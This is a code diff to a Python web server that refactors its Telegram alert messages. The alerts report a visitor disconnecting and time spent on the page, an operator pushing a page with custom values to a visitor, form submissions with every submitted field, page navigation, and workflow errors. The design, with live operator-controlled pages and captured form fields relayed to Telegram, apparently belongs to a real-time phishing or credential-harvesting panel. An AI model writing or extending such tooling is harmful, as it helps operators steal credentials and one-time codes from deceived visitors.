@@ -1327,14 +1327,14 @@ def _tg_stamp(when: Optional[float] = None) -> str:
     return moment.strftime("%Y-%m-%d %H:%M:%S")
 
 
-def _tg_time_row(when: Optional[float] = None):
+def _tg_time_row(when: Optional[float] = None, label: str = "Time"):
     """The time branch every notification shares.
 
     This row used to hold the last ten characters of the client id
     (``_yehwgj9l9``), which told an operator nothing. The clock time is what
     makes one message distinguishable from the next.
     """
-    return ("\U0001F551", "Time", _tg_esc(_tg_stamp(when)))
+    return ("\U0001F551", label or "Time", _tg_esc(_tg_stamp(when)))
 
 
 # ---------------------------------------------------------------------------
@@ -1427,6 +1427,91 @@ def _tg_workflow_finished_message(workflow: Dict[str, Any], steps_completed: int
         ("\u2705", "Steps completed", str(steps_completed)),
         _tg_time_row(),
     ])
+
+
+def _tg_disconnected_message(seconds: float) -> str:
+    """CLIENT DISCONNECTED — how long they stayed, and the clock time."""
+    try:
+        total = max(0, int(seconds))
+    except Exception:
+        total = 0
+    minutes, secs = divmod(total, 60)
+    duration = f"{minutes}m {secs}s" if minutes else f"{secs}s"
+    return (
+        "\U0001F534 <b>CLIENT DISCONNECTED</b>\n\n"
+        + _tg_tree([
+            ("\u23F1", "Time on page", duration),
+            _tg_time_row(label="Left at"),
+        ])
+    )
+
+
+def _tg_dispatch_message(
+    page_name: str,
+    binding_values: Optional[Dict[str, str]] = None,
+    page_id: str = "",
+) -> str:
+    """OPERATOR PAGE DISPATCH — what was sent to a visitor, and when.
+
+    The values the operator typed for this push are listed with it, so the
+    alert says what the visitor's copy actually shows.
+    """
+    message = (
+        "\U0001F4E4 <b>OPERATOR PAGE DISPATCH</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4C4", "Pushed page", _tg_esc(page_name or page_id or "-", 60)),
+            _tg_time_row(),
+        ])
+    )
+    values = {
+        str(k): str(v)
+        for k, v in (binding_values or {}).items()
+        if str(v if v is not None else "").strip()
+    }
+    if values:
+        message += "\n\n\U0001F4A0 <b>Page values</b>\n" + _tg_binding_lines({
+            "values": values,
+            "labels": _bind_label_map(page_id),
+        })
+    return message
+
+
+def _tg_form_submission_message(page_name: str, fields: Dict[str, Any]) -> str:
+    """FORM SUBMISSION DETECTED — the page, the clock time, then the values."""
+    return (
+        "\U0001F4E8 <b>FORM SUBMISSION DETECTED</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4C4", "Source page", _tg_esc(page_name or "-", 60)),
+            _tg_time_row(),
+        ])
+        + "\n\n\U0001F4DD <b>Submitted fields</b>\n"
+        + (_tg_field_lines(fields) or "No fields recorded")
+    )
+
+
+def _tg_navigation_message(page_name: str, page_id: str = "") -> str:
+    """PAGE NAVIGATION DETECTED — where they moved to, and when."""
+    return (
+        "\U0001F9ED <b>PAGE NAVIGATION DETECTED</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4C4", "Page", _tg_esc(page_name or page_id or "-", 60)),
+            _tg_time_row(),
+        ])
+    )
+
+
+def _tg_workflow_error_message(workflow: Dict[str, Any], error: Any) -> str:
+    """WORKFLOW EXECUTION ERROR — the flow, what broke, and when."""
+    workflow = workflow or {}
+    return (
+        "\u26A0\uFE0F <b>WORKFLOW EXECUTION ERROR</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4CB", "Workflow",
+             _tg_esc(workflow.get("name") or workflow.get("id") or "-", 60)),
+            ("\u2757", "Error", f"<code>{_tg_esc(error, 150)}</code>"),
+            _tg_time_row(),
+        ])
+    )
 
 
 def _tg_hint(message: str, width: int = 60) -> str:
@@ -10577,10 +10662,7 @@ async def _auto_workflow_runner(
             client_id, workflow.get("id"), exc,
         )
         tg_notify(
-            f"<b>WORKFLOW EXECUTION ERROR</b>\n\n"
-            f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
-            f"<b>Error Details:</b> <code>{_tg_esc(exc, 150)}</code>\n"
-            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+            _tg_workflow_error_message(workflow, exc),
             "notify_lpv_workflow",
         )
 
@@ -11023,22 +11105,10 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                             pass
                         try:
                             _fields = (payload or {}).get("fields") or {}
-                            if isinstance(_fields, dict) and _fields:
-                                _items = list(_fields.items())[:15]
-                                _lines = []
-                                for _i, (_k, _v) in enumerate(_items):
-                                    if isinstance(_v, list):
-                                        _v = ", ".join(str(x) for x in _v)
-                                    _lines.append(f"• <b>{_tg_esc(_k, 32)}:</b> <code>{_tg_esc(_v, 120)}</code>")
-                                _body = "\n".join(_lines)
-                            else:
-                                _body = "No fields recorded"
+                            if not isinstance(_fields, dict):
+                                _fields = {}
                             tg_notify(
-                                f"<b>FORM SUBMISSION DETECTED</b>\n\n"
-                                f"<b>Source Page:</b> {_tg_esc(page_name or '-', 60)}\n"
-                                f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n\n"
-                                f"<b>Submitted Fields:</b>\n"
-                                f"{_body}",
+                                _tg_form_submission_message(page_name, _fields),
                                 "notify_lpv_submit",
                             )
                         except Exception:
@@ -11082,9 +11152,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                     # Telegram: page view = progress through the chain.
                     try:
                         tg_notify(
-                            f"<b>PAGE NAVIGATION DETECTED</b>\n\n"
-                            f"<b>Page:</b> {_tg_esc(page_name or page_id or '-', 60)}\n"
-                            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                            _tg_navigation_message(page_name, page_id),
                             "notify_navigate",
                             flag_default=False,
                         )
@@ -11160,15 +11228,8 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
         except Exception:
             pass
         try:
-            _dur = max(0, int(time.time() - _lpv_connected_at))
-            _m, _s = divmod(_dur, 60)
-            _dur_txt = f"{_m}m {_s}s" if _m else f"{_s}s"
             tg_notify(
-                "\U0001F534 <b>CLIENT DISCONNECTED</b>\n\n"
-                + _tg_tree([
-                    ("\u23F1", "Time on page", _dur_txt),
-                    ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
-                ]),
+                _tg_disconnected_message(time.time() - _lpv_connected_at),
                 "notify_disconnect",
             )
         except Exception:
@@ -12374,9 +12435,9 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                         if ok:
                                             try:
                                                 tg_notify(
-                                                    f"<b>OPERATOR PAGE DISPATCH</b>\n\n"
-                                                    f"<b>Pushed Page:</b> {_tg_esc(page['name'], 60)}\n"
-                                                    f"<b>Target Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                                                    _tg_dispatch_message(
+                                                        page["name"], bind_values, page_id
+                                                    ),
                                                     "notify_lpv_push",
                                                 )
                                             except Exception:
